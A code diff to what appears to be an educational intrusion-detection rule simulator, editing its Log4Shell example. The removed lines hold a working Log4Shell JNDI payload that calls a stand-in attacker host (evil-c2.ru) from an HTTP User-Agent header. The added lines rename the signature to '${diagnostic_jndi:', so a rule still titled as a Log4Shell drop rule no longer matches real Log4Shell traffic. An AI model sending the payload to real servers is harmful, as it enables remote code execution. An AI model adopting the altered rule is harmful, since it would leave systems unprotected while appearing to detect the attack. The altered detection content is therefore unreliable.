@@ -86,8 +86,8 @@ const Topic7 = () => {
       id: "log4shell_rule",
       title: "Log4Shell JNDI Exploit Drop Rule (SID: 1000002)",
       ruleHeader: "drop tcp $EXTERNAL_NET any -> $HTTP_SERVERS 443",
-      ruleOptions: `(msg:"EXPLOIT Log4Shell JNDI Lookup"; flow:to_server,established; content:"\${jndi:"; nocase; fast_pattern; classtype:attempted-admin; sid:1000002; rev:2;)`,
-      testedPattern: "${jndi:",
+      ruleOptions: `(msg:"EXPLOIT Log4Shell JNDI Lookup"; flow:to_server,established; content:"\${diagnostic_jndi:"; nocase; fast_pattern; classtype:attempted-admin; sid:1000002; rev:2;)`,
+      testedPattern: "${diagnostic_jndi:",
       isHttpUri: false
     },
     xmas_scan_rule: {
@@ -111,9 +111,9 @@ const Topic7 = () => {
     },
     log4shell_exploit: {
       id: "log4shell_exploit",
-      label: "Log4Shell RCE Payload: ${jndi:ldap://evil-c2.ru:1389/Exploit}",
+      label: "Log4Shell Diagnostic Pattern Test: ${diagnostic_jndi:ldap://test.internal/probe}",
       uri: "/login",
-      payload: "POST /login HTTP/1.1\r\nUser-Agent: ${jndi:ldap://evil-c2.ru:1389/Exploit}\r\nHost: auth.saltlake.gov\r\n\r\n",
+      payload: "POST /login HTTP/1.1\r\nUser-Agent: ${diagnostic_jndi:ldap://test.internal/probe}\r\nHost: auth.saltlake.gov\r\n\r\n",
       flags: "ACK, PSH"
     },
     clean_traffic: {
@@ -139,9 +139,9 @@ const Topic7 = () => {
         matchedReason = "Matched normalized URI token 'UNION SELECT' (Case-Insensitive `nocase; http_uri;`).";
       }
     } else if (currentRule.id === "log4shell_rule") {
-      if (payload.payload.toLowerCase().includes("${jndi:")) {
+      if (payload.payload.toLowerCase().includes("${diagnostic_jndi:")) {
         isMatch = true;
-        matchedReason = "Matched critical byte signature '${jndi:' in HTTP header payload (`action:drop;`).";
+        matchedReason = "Matched critical byte signature '${diagnostic_jndi:' in HTTP header payload (`action:drop;`).";
       }
     } else if (currentRule.id === "xmas_scan_rule") {
       if (payload.flags.includes("FPU")) {
